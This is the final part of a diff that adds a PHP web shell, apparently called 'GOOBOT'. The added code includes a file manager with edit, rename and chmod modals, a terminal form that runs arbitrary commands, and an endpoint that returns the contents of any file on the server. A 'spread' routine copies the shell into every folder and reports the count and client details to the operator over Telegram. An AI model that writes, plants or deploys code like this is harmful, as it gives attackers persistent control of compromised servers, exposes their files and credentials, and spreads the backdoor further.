+                <input type="text" name="new_name" id="rename_new" required>
+                <button type="submit" name="rename" class="btn">Rename</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Chmod Modal -->
+    <div id="chmodModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="hideModal('chmodModal')">&times;</span>
+            <h3>🔒 Change Permissions</h3>
+            <form method="POST">
+                <input type="hidden" name="chmod_file" id="chmod_file">
+                <input type="text" name="chmod_perms" id="chmod_perms" placeholder="0644" required>
+                <div style="margin: 10px 0; padding: 10px; background: rgba(0, 255, 0, 0.1); border: 1px solid #00ff00; border-radius: 3px;">
+                    <strong>Common Permissions:</strong><br>
+                    0644 - rw-r--r-- (Files)<br>
+                    0755 - rwxr-xr-x (Folders/Executables)<br>
+                    0777 - rwxrwxrwx (All permissions)
+                </div>
+                <button type="submit" name="chmod" class="btn">Change</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Command Modal -->
+    <div id="cmdModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="hideModal('cmdModal')">&times;</span>
+            <h3>⚡ Terminal</h3>
+            <form method="POST">
+                <input type="text" name="command" placeholder="ls -la" value="<?php echo isset($_POST['command']) ? htmlspecialchars($_POST['command']) : ''; ?>">
+                <button type="submit" name="execute_cmd" class="btn">Execute</button>
+            </form>
+            <?php if(isset($output)): ?>
+            <div class="cmd-output"><?php echo htmlspecialchars($output); ?></div>
+            <?php endif; ?>
+        </div>
+    </div>
+
+    <script>
+        function showModal(id) {
+            document.getElementById(id).style.display = 'flex';
+        }
+        
+        function hideModal(id) {
+            document.getElementById(id).style.display = 'none';
+        }
+        
+        function editFile(path) {
+            document.getElementById('edit_file_path').value = path;
+            
+            fetch('?action=get_content&file=' + encodeURIComponent(path))
+                .then(r => r.text())
+                .then(content => {
+                    document.getElementById('edit_file_content').value = content;
+                    showModal('editModal');
+                });
+        }
+        
+        function renameItem(oldPath, oldName) {
+            document.getElementById('rename_old').value = oldPath;
+            document.getElementById('rename_new').value = oldName;
+            showModal('renameModal');
+        }
+        
+        function chmodItem(path) {
+            document.getElementById('chmod_file').value = path;
+            document.getElementById('chmod_perms').value = '0644';
+            showModal('chmodModal');
+        }
+        
+        window.onclick = function(event) {
+            if(event.target.classList.contains('modal')) {
+                event.target.style.display = 'none';
+            }
+        }
+    </script>
+</body>
+</html>
+
+<?php
+if(isset($_GET['action']) && $_GET['action'] == 'get_content') {
+    $file = realpath($_GET['file']);
+    if(file_exists($file) && is_file($file)) {
+        echo file_get_contents($file);
+    }
+    exit;
+}
+
+if(isset($_GET['spread'])) {
+    $count = spreadToAllFolders(3);
+    
+    $msg = "🔄 <b>GOOBOT - MANUAL SPREAD</b>\n\n";
+    $msg .= "📤 <b>Status:</b> Spread completed!\n";
+    $msg .= "📊 <b>Files Created:</b> {$count} copies\n\n";
+    $msg .= getClientInfo() . "\n";
+    $msg .= "⏰ <b>Time:</b> " . date('Y-m-d H:i:s');
+    
+    sendTelegram($msg);
+    
+    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($current_dir));
+    exit;
+}
+?>
